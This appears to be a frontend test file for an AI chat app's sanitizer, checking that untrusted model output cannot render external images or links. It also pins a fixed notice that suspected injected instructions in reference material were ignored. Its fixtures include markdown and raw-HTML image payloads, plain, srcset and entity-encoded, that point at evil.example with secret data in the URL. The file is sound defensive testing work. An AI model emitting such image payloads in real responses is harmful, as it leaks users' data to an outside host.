import { render } from '@testing-library/react'
import { describe, expect, it } from 'vitest'

import { MarkdownPreview } from '../components/MarkdownPreview'
import { INJECTION_NOTICE, isPlatformUrl, neutralizeUntrustedMarkdown } from './untrustedOutput'

describe('ANILA LM 外連', () => {
  it('非平台圖片不會留成可載入的 markdown', () => {
    const text = neutralizeUntrustedMarkdown('![x](http://evil.example/?q=secret)')
    expect(text).not.toContain('![x](')
    expect(text).not.toContain('](http://evil.example')
    expect(text).toContain('evil.example')
    expect(isPlatformUrl('/api/ingestion/images/1/blob')).toBe(true)
  })

  it('預覽不會把外連畫成 img 或 a', () => {
    const { container } = render(
      <MarkdownPreview markdown={'看 ![x](http://evil.example/?q=secret) 與 [點此](http://evil.example/x)'} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector("a[href*='evil.example']")).toBeNull()
    expect(container.textContent).toContain('evil.example')
  })

  it('較長圍欄與原始 HTML 都不會載入外站', () => {
    const fenced = neutralizeUntrustedMarkdown(
      '````\n```\ninside\n````\n![x](http://evil.example/?q=secret)',
    )
    expect(fenced).not.toContain('![x](')
    expect(fenced).toContain('inside')
    const html = neutralizeUntrustedMarkdown(
      '<img src="//evil.example/?q=資料"> <img srcset="//evil.example/a 1x"> &#60;img src="//evil.example/?q=資料"&#62;',
    )
    expect(html.toLowerCase()).not.toContain('<img')
    expect(html).not.toContain('&#60;')
    expect(isPlatformUrl('data:text/html,hi')).toBe(false)
    expect(isPlatformUrl('blob:https://evil.example/1')).toBe(false)
    const { container } = render(
      <MarkdownPreview markdown={'<img src="//evil.example/?q=資料"> ![x](data:image/png;base64,AAAA)'} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector("a[href*='evil.example']")).toBeNull()
  })

  it('回覆詳情的句子固定', () => {
    expect(INJECTION_NOTICE).toBe('參考資料中有疑似指令，已忽略')
  })
})
